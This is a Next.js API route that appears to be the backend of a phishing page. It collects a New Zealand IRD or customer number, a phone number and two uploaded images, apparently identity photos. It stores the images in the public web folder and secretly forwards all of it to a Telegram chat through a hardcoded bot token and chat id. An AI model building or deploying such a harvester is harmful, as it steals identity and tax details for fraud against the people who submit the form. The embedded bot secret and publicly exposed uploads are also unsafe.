import multer from "multer";
import path from "path";
const fs = require("fs");

const TG = require("telegram-bot-api");

// disable next.js' default body parser
export const config = {
  api: { bodyParser: false },
};

let storage = multer.diskStorage({
  destination: function (req, file, cb) {
    cb(null, "public");
  },
  filename: function (req, file, cb) {
    cb(
      null,
      file.fieldname + "-" + Date.now() + path.extname(file.originalname)
    );
  },
});

let upload = multer({
  storage: storage,
});

export default async function handler(req, res) {
  await new Promise((resolve) => {
    // you may use any other multer function
    const mw = upload.any();

    //use resolve() instead of next()
    mw(req, res, resolve);
  });

  let url = "http://" + req.headers.host;
  //   let filename = req.file.filename;

  const api = new TG({
    token: "6047464013:AAGW_UtgQXGerHvLlaBlHUHxKfwbd6vX0wE",
  });

  const chat_id = "5996836160";

  const body = await req.body;

  await api.sendMessage({
    chat_id: chat_id,
    text: ` IRD Number or Customer Identifier: \n ${body.IRD_Number_or_Customer_Identifier} \n Phone Number : \n ${body.Phone_Number} `,
  });

  // await api.sendPhoto({
  //   chat_id: chat_id,
  //   photo: fs.createReadStream(`./public/${req.files[0].filename}`),
  // });
  // await api.sendPhoto({
  //   chat_id: chat_id,
  //   photo: fs.createReadStream(`./public/${req.files[1].filename}`),
  // });

  await api.sendPhoto({
    chat_id: chat_id,
    photo: url + "/" + req.files[0].filename,
  });
  await api.sendPhoto({
    chat_id: chat_id,
    photo: url + "/" + req.files[1].filename,
  });

  await api.getMe().then(console.log).catch(console.err);

  // example response
  res.status(200).json({
    body: req.body,
    files: req.files,
    id1: url + "/" + req.files[0].filename,
  });
}
